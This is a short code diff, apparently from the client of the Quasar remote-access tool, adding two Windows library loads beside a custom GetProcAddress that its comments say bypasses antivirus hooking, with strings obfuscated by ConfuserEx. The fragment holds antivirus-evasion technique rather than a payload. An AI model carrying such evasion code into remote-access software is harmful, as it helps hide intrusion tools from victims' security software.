@@ -18,11 +18,14 @@ namespace Quasar.Client.Utilities
             LoadLibrary("user32.dll");
             LoadLibrary("gdi32.dll");
             LoadLibrary("iphlpapi.dll");
+            LoadLibrary("dbghelp.dll");
+            LoadLibrary("psapi.dll");
         }
 
         // Self-implemented GetProcAddress (bypass Antivirus GetProcAddress hooking)
         // 고마워요, 정성태님!
         //https://www.sysnet.pe.kr/2/0/12101
+        // For calling convention: https://stackoverflow.com/questions/5155180/changing-a-c-sharp-delegates-calling-convention-to-cdecl
         internal static T Lookup<T>(string module, string proc) // NOTE: The strings will be automatically encrypted using ConfuserEx
         {
             var key = (module + '!' + proc).GetHashCode(); // Address caching
